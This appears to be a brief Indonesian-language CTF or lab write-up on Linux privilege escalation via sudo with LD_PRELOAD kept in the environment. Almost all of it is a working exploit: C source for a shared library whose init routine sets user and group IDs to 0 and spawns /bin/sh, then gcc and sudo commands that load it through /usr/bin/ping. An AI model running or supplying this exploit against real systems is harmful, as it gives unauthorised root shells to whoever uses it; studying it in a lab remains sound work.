cek `sudo -l` dan dapat
```
...
    env_keep += LD_PRELOAD
...
    (root) /usr/bin/ping
```

buat file `smthng.c` dengan isi
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/sh");
}
```

gas compile dan run pake program
```
$ gcc -fPIC -shared -o smthng.so smthng.c -nostartfiles
$ sudo LD_PRELOAD=/home/user/smthng.so /usr/bin/ping
```

NOTE: error gpp, coba aja run.
